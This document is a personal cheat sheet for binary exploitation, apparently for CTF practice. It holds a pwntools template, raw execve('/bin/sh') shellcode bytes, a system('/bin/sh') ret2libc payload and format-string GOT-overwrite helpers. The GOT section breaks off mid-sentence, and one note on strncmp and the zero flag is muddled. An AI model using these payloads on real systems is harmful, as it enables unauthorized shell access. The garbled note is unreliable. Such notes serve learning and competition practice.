# Summary

## Overwriting GOT technique
If there is a format string vuln, you can use it to overwrite some function in GOT with an address of your buffer location on stack. Generally, you will place shellcode in this buffer. Then, when the program executes this 


## Generic Template
```python

from pwn import *

PROGNAME = "./<name>"
REMOTEIP = "<ip>"
REMOTEPORT = 1234

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

p.interactive()
```

## Shell code
```python
shellcode = asm(shellcraft.sh())  

#Smaller shellcode ~27 bytes
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

```

Buffer Overflows: Calculating return address offsets
```
cyclic 2000 | xclip -selection clipboard
cyclic -l <addr where program crashed>
```

## Creating payloads - pwntools fit
```
payload = fit({
    offset: elf.symbols["system"],
    offset + 4: p32(0), 
    offset + 8: p32(target) #The address to a string "/bin/sh"
})
```


## Format strings writing to an address
```python
def get_n(new, prev, size):
    while new <= prev:
        new += (1 << size)
    return new-prev

#Function that returns payload = <base_addr> + <base_addr + 1> + <base_addr + 2> + <base_addr + 3>
def gen_addrs(base_addr):
    addrs = b''
    for i in range(4):
        addrs += p32(base_addr + i)
    return addrs

#Function to return the format string
#Args - address to write, current payload length, printf stack 
def gen_format_writes(to_write, setup_len, stack_offset):
    payload = b''
    n_val = [setup_len]
    for i in range(4):
        n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
        payload += '%{}c'.format(n_val[i+1]).encode()
        payload += '%{}$hhn'.format(stack_offset + i).encode()
        print("Payload part " + str(i) + " = " + str(payload) )
    return payload
```

```python
fmtstr_payload(offset=12, writes={old_address: new_address})
```
Use numbwritten to specify the offset


## Common re
`strncmp` sets zero flag(ZF) to 0 if strings are equal. The jne branch will be taken if ZF=0 (i.e. if strings are eqla)
```
strncmp
test eax eax
```

## Regex patterns I've used
```python
match = re.search(r'0x[a-f0-9]+', p.recvline().decode())
leak = int(match.group(), 16)
```

## gcc compile
```
gcc hello.c -o hello32 -m32
``` 